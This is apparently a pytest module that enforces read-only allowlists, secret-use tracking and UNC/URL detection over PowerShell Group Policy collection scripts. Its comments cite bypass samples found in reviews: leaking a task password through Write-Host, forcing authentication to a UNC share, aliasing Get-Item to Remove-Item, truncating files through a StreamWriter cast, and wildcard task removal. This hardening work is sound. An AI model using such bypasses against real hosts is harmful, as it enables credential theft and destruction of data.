    return _run_dumper(exe, [str(_SCRIPTS / name) for name in sorted(POLICIES)])


@pytest.fixture(scope="module")
def inventory() -> dict[str, dict[str, Any]]:
    return _inventory_for(_pwsh())


def _exact(kind: str, script: str, used: set[str], allowed: frozenset[str]) -> None:
    unexpected = sorted(used - allowed)
    unused = sorted(allowed - used)
    assert not unexpected, f"{script}: {kind} outside the read-only allowlist: {unexpected}"
    assert not unused, f"{script}: stale {kind} allowlist entries (remove them): {unused}"


# ---------------------------------------------------------------------------
# Check functions. Each raises AssertionError on a violation. The per-script
# tests below call them against the real scripts; the regression suite calls
# run_all_checks against modified copies and asserts a failure.
# ---------------------------------------------------------------------------


def check_commands(script: str, entry: dict[str, Any], local: set[str]) -> None:
    policy = POLICIES[script]
    named = {c["name"] for c in entry["commands"] if c["name"]}
    _exact("commands", script, named - _cfset(local), _cfset(policy.commands))
    dynamic = {c["text"] for c in entry["commands"] if not c["name"]}
    _exact("dynamic invocations", script, dynamic, policy.dynamic_invocations)
    # Set-Variable / New-Variable / Set-Item / Tee-Object name a target in a
    # string the assignment AST cannot see; none are used, so forbid them.
    assert not entry["indirect_writes"], (
        f"{script}: indirect variable/item writes are not allowed: {entry['indirect_writes']}"
    )
    forbidden = sorted(named & _cfset(FORBIDDEN_COMMANDS))
    assert not forbidden, f"{script}: commands that are never allowed: {forbidden}"
    # A parameter token that binds to no real parameter of a known cmdlet (nor a
    # common parameter) errors at runtime; refuse it rather than treat it as
    # inert (DeepSeek round-5 NB-3: `Get-ChildItem -OutFile ...`).
    for command in entry["commands"]:
        if not command.get("cmdlet_known"):
            continue
        for arg in command["arguments"]:
            if arg["parameter"] and not arg.get("parameter_resolved", True):
                raise AssertionError(
                    f"{script}:{command['line']}: -{arg['parameter']} is not a parameter of "
                    f"{command['name']}"
                )
    # ForEach-Object may only run scriptblocks: `ForEach-Object Delete` /
    # `-MemberName Delete` invokes a method by name, invisible to the member
    # allowlist.
    for command in entry["commands"]:
        if command["name"] not in ("foreach-object", "%", "foreach"):
            continue
        for arg in command["arguments"]:
            param = arg["parameter"]
            if param is None:
                ok = arg["value_kind"] == "ScriptBlockExpressionAst"
            else:
                resolved = _resolve_param(
                    str(param), ["Begin", "Process", "End", "RemainingScripts"]
                )
                ok = resolved is not None and arg["value_kind"] == "ScriptBlockExpressionAst"
            assert ok, (
                f"{script}:{command['line']}: ForEach-Object must be given scriptblocks only "
                f"({_norm(command['text'])})"
            )


def check_dotnet(script: str, entry: dict[str, Any]) -> None:
    policy = POLICIES[script]
    members = entry["members"]
    dynamic = [m["text"] for m in members if m["dynamic_member"] or (m["static"] and not m["type"])]
    assert not dynamic, f"{script}: computed member/type names cannot be verified: {dynamic}"
    static = {_method_key(m["type"], m["member"]) for m in members if m["static"]}
    allowed_static = frozenset(_method_key(*k.split("::")) for k in policy.static_methods)
    _exact("static .NET methods", script, static, allowed_static)
    instance = {m["member"] for m in members if not m["static"]}
    _exact("instance .NET methods", script, instance, _cfset(policy.instance_methods))
    assigned = {a["target"] for a in entry["member_assignments"]}
    _exact("property assignments", script, assigned, policy.member_assignments)


# Types whose *construction/conversion* has no external side effect. A cast or
# ``-as`` to any other type is refused (Sol round 8: `[System.IO.StreamWriter]
# 'C:\\...\\x'` creates/truncates a file; `[System.IO.StreamReader]<UNC>` opens
# a remote read). Matches adcs-lens: allow inert value/collection types only.
_INERT_CAST_TYPES = frozenset(
    {
        "string",
        "char",
        "char[]",
        "int",
        "int[]",
        "long",
        "double",
        "decimal",
        "bool",
        "byte",
        "byte[]",
        "datetime",
        "timespan",
        "guid",
        "version",
        "hashtable",
        "ordered",
        "pscustomobject",
        "array",
        "object[]",
        "ref",  # [ref]$v for a TryParse out-parameter; the receiver is pinned
        "void",  # [void]expr discards a value
        "switch",
        "scriptblock",
        "type",  # `'Name' -as [type]` is a reflection lookup (does the type load?)
    }
)
# Parameter type constraints the scripts declare (param([T]$x)); a new one is a
# reviewed edit. These only type a parameter, they do not construct anything.
_ALLOWED_PARAMETER_TYPES = frozenset(
    {
        "string",
        "int",
        "switch",
        "byte[]",
        "timespan",
        "scriptblock",
        "pscredential",
        "system.management.automation.pscredential",
    }
)


# Non-inert types the scripts legitimately *reference* as a static-method/enum
# receiver or an argument value (e.g. `[IO.File]::Open`, `[StringComparison]::
# Ordinal`, `.Translate([System.Security.Principal.NTAccount])`). Instantiating
# any of them is still refused (the static-method allowlist governs `::new`/
# `::Open`), but a bare type *reference* to one is allowed. Casefolded; a new
# one is a reviewed edit. A `reference` to a type not here and not inert — e.g.
# a bare `[System.IO.StreamWriter]` — is refused.
_REFERENCED_TYPES = frozenset(
    {
        "math",
        "regex",
        "guid",
        "string",
        "datetime",
        "timespan",
        "type",
        "uint32",
        "environment",
        "platformid",
        "stringcomparison",
        "gpolens.markerfileinfo",
        "globalization.cultureinfo",
        "globalization.datetimestyles",
        "io.path",
        "io.file",
        "io.fileaccess",
        "io.fileattributes",
        "io.filemode",
        "io.fileshare",
        "io.memorystream",
        "io.compression.zipfile",
        "text.encoding",
        "text.utf8encoding",
        "collections.generic.hashset[guid]",
        "collections.generic.stack[string]",
        "system.io.file",
        "system.io.compression.zipfile",
        "system.io.compression.zipfileextensions",
        "system.security.principal.ntaccount",
        "system.stringcomparer",
        "system.collections.generic.hashset[string]",
        "system.collections.generic.list[object]",
        "system.collections.generic.list[string]",
    }
)


def check_cast_types(script: str, entry: dict[str, Any]) -> None:
    """Every type-conversion or type-reference construct goes through an
    allowlist (DeepSeek round 9: `-as` and `-is`/`-isnot` are BinaryExpressionAst,
    not ConvertExpressionAst, so they bypassed the cast check). A non-literal
    conversion type (`$x -as $typeVar`) is refused outright."""
    for usage in entry["type_usages"]:
        role, name = usage["role"], _cf(usage["type"])
        where = f"{script}: {role} type {usage['type']!r}"
        if usage["computed"]:
            raise AssertionError(f"{where} is computed and cannot be pinned")
        if role in ("convert", "as"):
            assert name in _INERT_CAST_TYPES, (
                f"{where}: conversion to a type with side-effecting construction is not allowed"
            )
        elif role == "constraint":
            assert name in _ALLOWED_PARAMETER_TYPES, (
                f"{where}: parameter type outside the allowlist"
            )
        else:  # reference, is, isnot — referenced only, never constructed here
            assert name in _INERT_CAST_TYPES or name in _REFERENCED_TYPES, (
                f"{where}: type reference outside the allowlist"
            )


def check_types(script: str, entry: dict[str, Any]) -> None:
    refs = list(entry["type_references"])
    for assignment in entry["member_assignments"]:
        refs += assignment.get("receiver_types", [])
    # Cast targets are governed by the inert allowlist (check_cast_types); type
    # literals used as a `::` receiver are governed by the static-method
    # allowlist. Here keep the denylist over type references and member-receiver
    # types as the backstop (a scriptblock/pscredential *parameter* type is
    # legitimate and is not a construction).
    hits = sorted({t for t in refs if any(s in _cf(t) for s in _FORBIDDEN_TYPE_SUBSTRINGS)})
    assert not hits, f"{script}: forbidden .NET/COM/AD type reference: {hits}"


def check_instance_receivers(script: str, entry: dict[str, Any]) -> None:
    allowed = {_cf(k): v for k, v in INSTANCE_RECEIVERS.get(script, {}).items()}
    side_effecting = _cfset(_SIDE_EFFECTING_METHODS | _LIFETIME_METHODS)
    for member in entry["members"]:
        if member["static"]:
            continue
        name = member["member"]
        receiver_var = member["receiver_var"]
        if receiver_var is None:
            # No pinnable receiver variable. A side-effecting method on a
            # parenthesized/command result ((Get-Item x).Delete(), FileInfo
            # .CopyTo, [WMI]...Delete()) is rejected; a pure read/string method
            # (e.g. ($_ | Out-String).TrimEnd()) is fine (type denylist already
            # screened any type-literal receiver).
            assert name not in side_effecting, (
                f"{script}:{member['line']}: side-effecting method {name!r} on a non-variable "
                f"receiver {member['receiver']!r} (needs a pinned receiver variable)"
            )
            continue
        permitted = allowed.get(name, frozenset())
        assert receiver_var in permitted, (
            f"{script}:{member['line']}: instance method {name!r} called on unexpected receiver "
            f"${receiver_var} (allowed: {sorted(permitted)})"
        )


def _is_variable_param(arg: dict[str, Any]) -> bool:
    canon = arg.get("parameter_canonical")
    if canon:
        return _cf(canon) in _VARIABLE_WRITING_CANON
    return _cf(str(arg["parameter"])).endswith("variable")


# A variable-writing common parameter must name its target as a plain literal
# identifier (optionally `+` for append). A computed name (`('Output'+'Root')`,
# `$n`, `${OutputRoot}`) cannot be pinned, so it is refused (DeepSeek NEW-BL-3,
# NON-BL-2).
_LITERAL_VARIABLE_NAME = re.compile(r"^\+?[A-Za-z_][A-Za-z0-9_]*$")


def _common_param_writes(entry: dict[str, Any]) -> list[dict[str, Any]]:
    """Every -OutVariable/-ErrorVariable/... use: line, parameter, target, literal.

    These bind a variable with no assignment AST node (Sol BL-1). ``literal`` is
    true only for a bare identifier argument; ``target`` is the variable name it
    writes (``+`` stripped) or the raw text when it is not literal.
    """
    writes: list[dict[str, Any]] = []
    for command in entry["commands"]:
        for arg in command["arguments"]:
            if arg["parameter"] and _is_variable_param(arg):
                raw = _norm(arg["value"])
                literal = arg["value_kind"] == "StringConstantExpressionAst" and bool(
                    _LITERAL_VARIABLE_NAME.match(raw)
                )
                writes.append(
                    {
                        "line": command["line"],
                        "function": command["function"],
                        "parameter": str(arg["parameter"]),
                        "target": raw.lstrip("+") if literal else raw,
                        "literal": literal,
                    }
                )
    return writes


def check_usings(script: str, entry: dict[str, Any]) -> None:
    assert not entry["using_statements"], (
        f"{script}: `using` statements are not allowed "
        f"(assembly/module/namespace load): {[u['text'] for u in entry['using_statements']]}"
    )


def check_redirections(script: str, entry: dict[str, Any]) -> None:
    for redir in entry["redirections"]:
        if redir["kind"] == "merging":
            continue  # stream merge (e.g. *>&1); writes no file
        assert _norm(redir["location"]) == "$null", (
            f"{script}:{redir['line']}: file redirection must target $null, "
            f"not {redir['location']!r}"
        )


def check_new_object_and_add_type(script: str, entry: dict[str, Any]) -> None:
    policy = POLICIES[script]
    types: set[str] = set()
    assemblies: set[str] = set()
    definitions: set[str] = set()
    for command in entry["commands"]:
        bound = command["bound"]
        if command["name"] == "new-object":
            assert "comobject" not in bound, f"{script}:{command['line']}: COM is not allowed"
            types.add(_cf(str(bound.get("typename"))))
        elif command["name"] == "add-type":
            keys = set(bound) - {"erroraction"}
            if keys == {"assemblyname"}:
                assemblies.add(_cf(bound["assemblyname"]))
            elif keys == {"typedefinition"} and command["type_definition_sha256"]:
                definitions.add(command["type_definition_sha256"])
            else:
                # AssertionError (not pytest.fail) so _run_checks and the
                # generator report it as a check failure (Sol round-4 NB-3).
                raise AssertionError(
                    f"{script}:{command['line']}: unsupported Add-Type form {sorted(keys)}"
                )
    _exact("New-Object types", script, types, _cfset(policy.new_object_types))
    _exact("Add-Type assemblies", script, assemblies, _cfset(policy.add_type_assemblies))
    _exact("Add-Type inline definitions (sha256)", script, definitions, policy.add_type_definitions)


def _write_targets(entry: dict[str, Any]) -> list[tuple[int, str]]:
    targets: list[tuple[int, str]] = []
    for command in entry["commands"]:
        name = command["name"] or ""
        required = _WRITE_COMMANDS_CF.get(name)
        optional = _OPTIONAL_PATH_COMMANDS_CF.get(name)
        params = required or optional
        if params is None:
            continue
        bound = [command["bound"][p] for p in params if isinstance(command["bound"].get(p), str)]
        if not bound:
            if optional is not None:
                continue
            raise AssertionError(
                f"line {command['line']}: cannot resolve the write target of {command['text']}"
            )
        targets.extend((command["line"], text) for text in bound)
    for member in entry["members"]:
        if member["static"] and _method_key(member["type"], member["member"]) in _WRITE_STATIC_CF:
            targets.append((member["line"], member["first_argument"] or ""))
    return targets


def check_writes(script: str, entry: dict[str, Any]) -> None:
    roots = set(WRITE_ROOTS[script])
    assert roots <= set(PINNED_VARS[script]), (
        f"{script}: every write root must be pinned: {roots - set(PINNED_VARS[script])}"
    )
    pinned_targets = WRITE_TARGET_EXPRESSIONS[script]
    used: set[str] = set()
    for line, text in _write_targets(entry):
        norm = _norm(text)
        # Closed set: the write target must be exactly one of the pinned path
        # expressions. This refuses `Join-Path $root $childData`, a `$env:` or
        # `..` component, and any computed child (Sol BL-4); the anchoring root
        # is separately pinned (check_pinned_bindings).
        assert norm in pinned_targets, (
            f"{script}:{line}: write target {norm!r} is not a pinned path expression"
        )
        assert not _ABSOLUTE_LITERAL.search(norm), f"{script}:{line}: absolute/UNC/.. in {norm!r}"
        assert not _PROVIDER.search(norm), f"{script}:{line}: provider path in {norm!r}"
        used.add(norm)
    # New-Item must not create links, target a provider, or carry a -Name
    # component (another path segment, Sol BL-4), -Value or -Target path.
    for command in entry["commands"]:
        if command["name"] != "new-item":
            continue
        bound = command["bound"]
        item_type = _cf(str(bound.get("itemtype", "")))
        assert item_type not in _FORBIDDEN_ITEM_TYPES, (
            f"{script}:{command['line']}: New-Item -ItemType {bound.get('itemtype')} is not allowed"
        )
        assert "psprovider" not in bound, (
            f"{script}:{command['line']}: New-Item -PSProvider blocked"
        )
        assert "name" not in bound, (
            f"{script}:{command['line']}: New-Item -Name is a path component and is not allowed"
        )
        for key in ("value", "target"):
            value = bound.get(key)
            if isinstance(value, str):
                assert not _ABSOLUTE_LITERAL.search(value) and not _PROVIDER.search(value), (
                    f"{script}:{command['line']}: New-Item -{key} {value!r} escapes the roots"
                )
    _exact("write-target expressions", script, used, pinned_targets)


def check_pinned_bindings(script: str, inv: dict[str, dict[str, Any]]) -> None:
    """Every required variable (write roots, receivers, splats, exec/task inputs,
    and transitively everything their bindings read) is pinned, and each pinned
    variable's complete binding set equals the committed set exactly.

    A binding is any way the variable acquires a value (see the binding-key
    legend above), so a receiver rebind (`$entry = Get-Item <SYSVOL>`, Sol
    round-3 BL-2), a call-site argument to a local function's root parameter
    (`Write-GpoLensOwnerMarkerBytes -OutputRoot <SYSVOL>`), a `[ref]`, a `++`, a
    property/index write on a pinned object, or a variable-writing common
    parameter all change the set and fail.
    """
    pinned = PINNED_VARS[script]
    required = _required_vars(script, inv)
    unpinned = sorted(set(required) - set(pinned))
    assert not unpinned, f"{script}: variables must be pinned: " + "; ".join(
        f"${v} ({required[v]})" for v in unpinned
    )
    stale = sorted(set(pinned) - set(required))
    assert not stale, f"{script}: PINNED_VARS entries no longer required (remove them): {stale}"
    bindings = _all_bindings(script, inv)
    for var in sorted(pinned):
        actual = bindings.get(var, set())
        allowed = pinned[var]
        extra = sorted(actual - allowed)
        missing = sorted(allowed - actual)
        assert not extra, (
            f"{script}: ${var} has undocumented binding(s) {extra} "
            "(a confined write/exec/receiver variable cannot be rebound)"
        )
        assert not missing, f"{script}: stale pinned binding(s) for ${var}: {missing}"
        for key in actual:
            if key.startswith("foreach "):
                assert not _ABSOLUTE_LITERAL.search(key) and not _PROVIDER.search(key), (
                    f"{script}: foreach source for pinned ${var} carries an absolute/UNC/provider "
                    f"path: {key!r}"
                )
            elif key.startswith("param "):
                assert not _UNC_OR_DOTDOT.search(key) and not _PROVIDER.search(key), (
                    f"{script}: ${var} parameter default is an unsafe path: {key!r}"
                )
    _, unresolved = _call_site_bindings(script, inv)
    assert not unresolved, f"{script}: call-site arguments that bind no parameter: {unresolved}"


def check_bindings(script: str, entry: dict[str, Any]) -> None:
    """Assignment forms that cannot be pinned, or that rebind the engine.

    Refuses: a provider/drive or `$global:` assignment target (Sol round-3
    `${Alias:Get-Item} = 'Remove-Item'`, `$env:PSModulePath`, `${C:\\x}`); any
    write to an automatic/preference variable outside SPECIAL_BINDINGS; any
    reference to $PSDefaultParameterValues/$PSModuleAutoLoadingPreference/
    $ExecutionContext (DeepSeek NEW-BL-1); an index write outside
    INDEX_ASSIGNMENT_ROOTS; multiple assignment and other unpinnable left-hand
    sides; a drive-qualified variable read other than `$env:`; and a computed or
    unlisted variable-writing common-parameter target (DeepSeek NEW-BL-3).
    """
    others = [a["target"] for a in entry["other_assignments"]]
    assert not others, f"{script}: unpinnable assignment targets: {others}"
    specials: set[tuple[str, str]] = set()
    for binding in entry["variable_assignments"]:
        name = binding["name"]
        where = f"{script}:{binding['line']}"
        assert binding["is_variable"] and binding["qualifier"] in _ALLOWED_QUALIFIERS, (
            f"{where}: ${name} is a provider/drive or global-scope write ({binding['kind']})"
        )
        assert binding["kind"] != "multi", f"{where}: multiple assignment to ${name} is not allowed"
        bare = _bare_var(name)
        if bare == "null" and binding["kind"] == "assign" and binding["operator"] == "Equals":
            continue  # `$null = expr` discards output
        if bare in _SPECIAL_VARIABLES or bare.endswith("preference"):
            specials.add((bare, _binding_key(binding)))
    unexpected = sorted(specials - SPECIAL_BINDINGS[script])
    assert not unexpected, (
        f"{script}: writes to automatic/preference variables are not allowed: {unexpected}"
    )
    _exact("automatic/preference variable writes", script, specials, SPECIAL_BINDINGS[script])
    for ref in entry["variable_refs"]:
        bare = _bare_var(ref["name"])
        assert bare not in FORBIDDEN_VARIABLE_REFS, (
            f"{script}: ${ref['name']} may not be referenced"
        )
        assert ref["drive"] in ("", "env"), (
            f"{script}: provider-qualified variable ${{{ref['name']}}} is not allowed"
        )
    roots = {_cf(i["root_var"] or "") for i in entry["index_assignments"]}
    unexpected_roots = sorted(roots - INDEX_ASSIGNMENT_ROOTS[script])
    assert not unexpected_roots, (
        f"{script}: index writes on {unexpected_roots} are not allowed "
        f"({[i['target'] for i in entry['index_assignments']]})"
    )
    _exact("index-write roots", script, roots, INDEX_ASSIGNMENT_ROOTS[script])
    targets: set[str] = set()
    for write in _common_param_writes(entry):
        assert write["literal"], (
            f"{script}:{write['line']}: -{write['parameter']} target {write['target']!r} must be a "
            "literal variable name (a computed name cannot be pinned)"
        )
        targets.add(_bare_var(write["target"]))
    _exact(
        "variable-writing common-parameter targets", script, targets, COMMON_PARAM_TARGETS[script]
    )


def check_ast(script: str, entry: dict[str, Any]) -> None:
    """Whole-tree screens: every node type serializable and in the closed set;
    no `#Requires` (module auto-import, Sol round-3 BL-1); no background jobs or
    parallel foreach; ASCII source (Windows PowerShell 5.1 reads a BOM-less file
    as ANSI, so non-ASCII bytes could parse differently there than here)."""
    assert not entry["unsupported_nodes"], (
        f"{script}: AST nodes the serializer does not cover: {entry['unsupported_nodes']}"
    )
    extra = sorted(set(entry["node_types"]) - ALLOWED_NODE_TYPES)
    assert not extra, f"{script}: AST node types outside the closed set: {extra}"
    assert not entry["script_requirements"], f"{script}: #Requires is not allowed"
    assert not entry["background_pipelines"], (
        f"{script}: background jobs (`&`) are not allowed: {entry['background_pipelines']}"
    )
    for row in entry["ast_rows"]:
        if row[2] in ("ForEachStatementAst", "SwitchStatementAst"):
            # Any foreach/switch flag (-Parallel, switch -regex/-wildcard/
            # -casesensitive) changes matching/execution semantics; the op
            # context does not record switch flags, so refuse them here (the
            # scripts use a plain `foreach` and a plain `switch`). Sol round 8.
            flags = dict(row[3]).get("Flags", "None")
            assert flags == "None", f"{script}: a {row[2]} flag ({flags}) is not allowed"
    assert entry["source_non_ascii_bytes"] == 0, (
        f"{script}: source has {entry['source_non_ascii_bytes']} non-ASCII bytes"
    )
    # LF only (.gitattributes pins it): the golden digests exact bytes, and a CR
    # inside a multi-line literal would change that literal's value (Sol r4 NB-2).
    assert entry["source_cr_bytes"] == 0, (
        f"{script}: source has {entry['source_cr_bytes']} CR bytes (LF line endings only)"
    )


def check_local_functions(script: str, entry: dict[str, Any]) -> None:
    names = list(entry["functions"])
    assert len(names) == len(set(names)), f"{script}: a function is defined twice"
    expected = [_cf(n) for n in LOCAL_FUNCTIONS[script]]
    assert names == expected, (
        f"{script}: defined functions {names} differ from LOCAL_FUNCTIONS {expected}"
    )


def _function_body_digest(fn: dict[str, Any]) -> str:
    text = "\n".join(_ast_line(row) for row in fn["body_rows"])
    return hashlib.sha256(text.encode("utf-8")).hexdigest()


def check_local_function_bodies(script: str, entry: dict[str, Any]) -> None:
    """Every local function's whole normalized syntax tree is pinned by digest
    in LOCAL_FUNCTION_BODIES (hand-maintained; the generator never writes it).

    The dataflow pins see a helper's call expression, not what it returns or
    does: Sol round 4 changed Get-GpoLensCompletedExports to emit an outside-
    root FileInfo (into a pinned Remove-Item via the catch path) and
    ConvertTo-GpoLensTaskArgument to return a constant UNC `-File` target, with
    every pin unchanged. Any edit to a function body now needs a reviewed
    digest update here.
    """
    actual = {fn["name"]: _function_body_digest(fn) for fn in entry["function_params"]}
    allowed = {_cf(k): v for k, v in LOCAL_FUNCTION_BODIES[script].items()}
    changed = sorted(n for n in actual if n in allowed and actual[n] != allowed[n])
    assert not changed, (
        f"{script}: function bodies changed (review, then update LOCAL_FUNCTION_BODIES): "
        + ", ".join(f"{n} -> {actual[n]}" for n in changed)
    )
    _exact("pinned function bodies", script, set(actual), frozenset(allowed))


# EVERY command invocation (Sol round 5: extra calls of allowlisted read/output
# commands — `Write-Host "captured=$taskPassword"`, `Get-Item \\host\share\...` —
# were unpinned), plus every write/exec/lifetime .NET call, is pinned with its
# exact normalized text AND control-flow context (enclosing functions,
# conditions, loops, try/catch/finally, scriptblock arguments, and every
# preceding guard — an `if` that throws/returns, an `Assert-*` call, an exit
# statement) as a multiset. A new or duplicated call, a call moved outside its
# guard (Sol round-3 Unregister copy, round-4 NB-1 marker write), a guard moved
# after an operation, or a weakened guard condition changes the multiset.
# (Inside local functions the body digest pins the same calls again.)
_GUARDED_STATIC = frozenset(
    _method_key(*k.split("::"))
    for k in _WRITE_STATIC | {"IO.Compression.ZipFileExtensions::CreateEntryFromFile"}
)
_GUARDED_INSTANCE = _cfset(_SIDE_EFFECTING_METHODS | _LIFETIME_METHODS)


def _guarded_ops(script: str, inv: dict[str, dict[str, Any]]) -> list[tuple[str, tuple[str, ...]]]:
    entry = inv[script]
    ops: list[tuple[str, tuple[str, ...]]] = []
    for command in entry["commands"]:
        ops.append((_norm(command["text"]), tuple(_norm(c) for c in command["context"])))
    # EVERY .NET call (static and instance), by exact text and context — not only
    # write/lifetime methods. Sol round 7: a computed-UNC `IO.File::ReadAllBytes`
    # and an extra `$knownIds.Add(...)` were invisible when only a subset was
    # pinned and the rest compared as a name set.
    for member in entry["members"]:
        ops.append((_norm(member["text"]), tuple(_norm(c) for c in member["context"])))
    # EVERY property access (getter/setter), same as calls: Sol round 8 showed a
    # getter can have a side effect (`([IO.FileInfo]$unc).Length` stats a remote
    # path, `([IO.DirectoryInfo]$unc).Exists`). check_cast_types refuses the
    # cast; this pins the access text+context as a second layer.
    for prop in entry["properties"]:
        ops.append((_norm(prop["text"]), tuple(_norm(c) for c in prop["context"])))
    return ops


def check_guarded_ops(script: str, inv: dict[str, dict[str, Any]]) -> None:
    from collections import Counter

    actual = Counter(_guarded_ops(script, inv))
    allowed = Counter(GUARDED_OPS[script])
    extra = actual - allowed
    missing = allowed - actual
    assert not extra and not missing, (
        f"{script}: command invocations, write/exec operations or their guards changed.\n"
        + "".join(f"  unexpected: {op} @ {' > '.join(ctx)}\n" for op, ctx in sorted(extra))
        + "".join(f"  missing:    {op} @ {' > '.join(ctx)}\n" for op, ctx in sorted(missing))
    )


# Secret-bearing variables (Sol round 5): the service-account credential and the
# plaintext password extracted from it, plus anything assigned from them.
SECRET_VARIABLES: dict[str, frozenset[str]] = {
    "Export-GpoEstate.ps1": frozenset(),
    "Export-GroupMembers.ps1": frozenset({"credential"}),
    "Export-Principals.ps1": frozenset({"credential"}),
    "Run-GpoLensCollection.ps1": frozenset(),
    "GpoLensCollectionMarker.ps1": frozenset(),
    "Register-GpoLensCollection.ps1": frozenset({"credential", "taskpassword"}),
}
_ASSIGNED_ROOT = re.compile(
    r"^\$(?:script:|local:|private:)?([A-Za-z_][A-Za-z0-9_]*)[^=]*?(?:\+)?=(?!=)"
)


def _secret_variables(script: str, entry: dict[str, Any]) -> set[str]:
    """Seeds plus every variable a statement reading a secret assigns to
    (`$taskPassword = $Credential...`, `$adParams.Credential = $Credential`)."""
    secrets = set(SECRET_VARIABLES[script])
    changed = True
    while changed:
        changed = False
        for use in entry["variable_uses"]:
            if use["name"] not in secrets:
                continue
            match = _ASSIGNED_ROOT.match(use["statement"])
            if match and _cf(match.group(1)) not in secrets:
                secrets.add(_cf(match.group(1)))
                changed = True
    return secrets


def _secret_uses(script: str, entry: dict[str, Any]) -> list[tuple[str, str, str]]:
    secrets = _secret_variables(script, entry)
    return [
        (u["name"], u["function"], u["statement"])
        for u in entry["variable_uses"]
        if u["name"] in secrets
    ]


def check_secret_uses(script: str, entry: dict[str, Any]) -> None:
    """Every read or write of a secret-bearing variable is one of the committed
    uses (declaration, validation, GetNetworkCredential() extraction, the single
    Register-ScheduledTask -Password site, splatting into the AD reads, and
    clearing). Interpolation into a message, an argument to any other command,
    a pipeline, a member access or a copy to another variable is a new use and
    is refused."""
    from collections import Counter

    actual = Counter(_secret_uses(script, entry))
    allowed = Counter(SECRET_USES[script])
    extra = actual - allowed
    missing = allowed - actual
    assert not extra and not missing, (
        f"{script}: secret-variable uses changed.\n"
        + "".join(f"  unexpected: ${n} [{f or 'script'}] {st}\n" for n, f, st in sorted(extra))
        + "".join(f"  missing:    ${n} [{f or 'script'}] {st}\n" for n, f, st in sorted(missing))
    )


# A UNC / remote path (`\\host\share`, `//host/share`, `\\?\UNC\...`) in any
# command argument: a read of an attacker-addressed share also forces outbound
# authentication from the DC (Sol round 5). None are used; refuse all.
_REMOTE_PATH = re.compile(r"""(?:^|['"(\s])(?:\\\\|//)[^\\/\s'"]""")


def check_remote_paths(script: str, entry: dict[str, Any]) -> None:
    for command in entry["commands"]:
        for arg in command["arguments"]:
            value = arg["value"] or ""
            assert not _REMOTE_PATH.search(value), (
                f"{script}:{command['line']}: remote/UNC path in a command argument: {value!r}"
            )


# Remote-looking string literals anywhere in a script (UNC `\\host\share`,
# `//host/share`, `\\?\UNC\...`, device paths, URLs `scheme://`): a variable
# bound to one reaches commands whose text is pinned (Sol round 6). Only these
# exact literal values may occur (casefolded script -> values, with reasons).
_REMOTE_LITERAL = re.compile(r"(?:^|[\s'\"(,;=])(?:\\\\|//)\S|\b[A-Za-z][A-Za-z0-9+.-]+://")
REMOTE_LITERALS: dict[str, frozenset[str]] = {
    # The collector's one deliberate remote read: the domain's own SYSVOL
    # Policies share, built from the domain's DNS root (read-only copy source).
    "Export-GpoEstate.ps1": frozenset({"\\\\$($dom.DNSRoot)\\SYSVOL\\$($dom.DNSRoot)\\Policies"}),
    "Export-GroupMembers.ps1": frozenset(),
    "Export-Principals.ps1": frozenset(),
    "Run-GpoLensCollection.ps1": frozenset(),
    "GpoLensCollectionMarker.ps1": frozenset(),
    # A regex (double trailing backslashes in ConvertTo-GpoLensTaskArgument), not a path.
    "Register-GpoLensCollection.ps1": frozenset({"(\\\\+)$"}),
}


def _string_literals(entry: dict[str, Any]) -> list[str]:
    values: list[str] = []
    for row in entry["ast_rows"]:
        if row[2] in ("StringConstantExpressionAst", "ExpandableStringExpressionAst"):
            value = dict(row[3]).get("Value")
            if isinstance(value, str):
                values.append(value)
    return values


def check_remote_literals(script: str, entry: dict[str, Any]) -> None:
    """Every UNC/`//host`/device/URL-looking string literal must be in the
    committed REMOTE_LITERALS set. Exempt entries are the domain's own SYSVOL
    Policies share (the one deliberate remote read) and the `(\\+)$` regex in
    ConvertTo-GpoLensTaskArgument (a backslash-doubling pattern, not a path)."""
    found = {v for v in _string_literals(entry) if _REMOTE_LITERAL.search(v)}
    unexpected = sorted(found - REMOTE_LITERALS[script])
    assert not unexpected, f"{script}: remote/UNC/URL-looking string literals: {unexpected}"
    _exact("remote-looking literals", script, found, REMOTE_LITERALS[script])


# Every TaskName parameter of the task scripts carries this validator, so a
# wildcard (`*`, `?`, `[...]`), path or quote character can never reach
# Unregister-/Register-ScheduledTask (Sol round 5: `-TaskName '*' -Unregister`
# removed every matching task).
TASK_NAME_VALIDATOR = "[ValidatePattern('^[A-Za-z0-9][A-Za-z0-9 ._-]{0,199}$')]"
_TASK_NAME_SCRIPTS = ("Register-GpoLensCollection.ps1", "Run-GpoLensCollection.ps1")


def check_task_name_validator(script: str, entry: dict[str, Any]) -> None:
    if script not in _TASK_NAME_SCRIPTS:
        return
    decls = [d for d in entry["parameter_decls"] if d["name"] == "taskname"]
    assert decls, f"{script}: no TaskName parameter found"
    for decl in decls:
        assert TASK_NAME_VALIDATOR in decl["attributes"], (
            f"{script}: TaskName parameter of {decl['function'] or 'the script'} lacks "
            f"{TASK_NAME_VALIDATOR}: {decl['attributes']}"
        )


def _header_digest(entry: dict[str, Any]) -> str:
    text = "\n".join(_ast_line(row) for row in entry["header_rows"])
    return hashlib.sha256(text.encode("utf-8")).hexdigest()


def check_script_header(script: str, entry: dict[str, Any]) -> None:
    """The script's own attributes and param block ([CmdletBinding(Supports-
    ShouldProcess)], parameters, validators, defaults) are pinned by a hand-
    maintained digest: turning ShouldProcess off (Sol round 5) or dropping a
    validator is a reviewed edit."""
    actual = _header_digest(entry)
    assert actual == SCRIPT_HEADERS[script], (
        f"{script}: script attributes/param block changed (review, then update "
        f"SCRIPT_HEADERS): {actual}"
    )


def _pipeline_inputs(entry: dict[str, Any]) -> list[tuple[str, tuple[str, ...]]]:
    return [
        (_norm(pin["text"]), tuple(_norm(c) for c in pin["context"]))
        for pin in entry["pipeline_inputs"]
    ]


def check_pipeline_inputs(script: str, entry: dict[str, Any]) -> None:
    """Expression-valued pipeline inputs (a non-command element feeding a
    multi-element pipeline) pinned by exact text + context as a multiset. Sol
    round 7: `(@([pscustomobject]@{FullName=<UNC>}) + @(Get-ChildItem ...)) |
    ForEach-Object { Copy-Item ... }` added an object to the SYSVOL copy without
    changing any command text."""
    from collections import Counter

    actual = Counter(_pipeline_inputs(entry))
    allowed = Counter(PIPELINE_INPUTS[script])
    extra = actual - allowed
    missing = allowed - actual
    assert not extra and not missing, (
        f"{script}: pipeline input expressions changed.\n"
        + "".join(f"  unexpected: {t} @ {' > '.join(c)}\n" for t, c in sorted(extra))
        + "".join(f"  missing:    {t} @ {' > '.join(c)}\n" for t, c in sorted(missing))
    )


# Roles that are an ancestor's *context* (not its nested statements): a change
